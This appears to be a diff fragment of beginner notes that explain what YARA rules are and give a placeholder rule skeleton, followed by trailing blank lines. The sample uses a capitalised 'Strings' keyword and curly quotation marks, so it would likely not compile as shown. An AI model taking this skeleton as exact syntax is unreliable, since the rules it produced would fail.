+7.YARA rule : 
+	YARA is malware identification and classification that worked by matching patterns across various malware samples.
+	What you can do with yara?: 
+	signature based identification based on perticular signature.
+	You can generate rules that identify perticular signature then can be used to detect future similar infections.
+
+	Simple YARA rule :
+		structure: 
+		rule <rule-name>
+		{
+			meta:
+				description = “simple yara rule”
+			Strings : 
+				$a = “example”
+				$b = “example2”
+
+			condition : 
+				($a or $b)
+		}
+
+
+
+
+
+ 	
+	
+		
+	
+		
+	
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
